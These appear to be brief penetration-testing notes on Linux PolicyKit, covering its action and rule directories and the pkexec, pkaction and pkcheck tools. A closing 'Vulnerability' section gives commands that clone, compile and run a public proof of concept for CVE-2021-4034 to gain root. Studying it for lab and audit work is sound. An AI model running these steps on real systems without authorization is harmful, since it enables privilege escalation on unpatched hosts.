PolicyKit - allows software and system components to communicate with each other if the user software is authorized to do so.

Polkit works with two groups of files:
1. actions/policies (/usr/share/polkit-1/actions)
2. rules (/usr/share/polkit-1/rules.d)

Polkit also has local authority rules chich can set or remove additional permissions for users and groups

Three additional programs:
- pkexec: runs a program with the rights of another user or with root rights
- pkaction: can be used to display actions
- pkcheck: this can be used to check if a process is authorized for a specific action

```shell-session
pkexec -u root id
```

**Vulnerability
```shell-session
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```
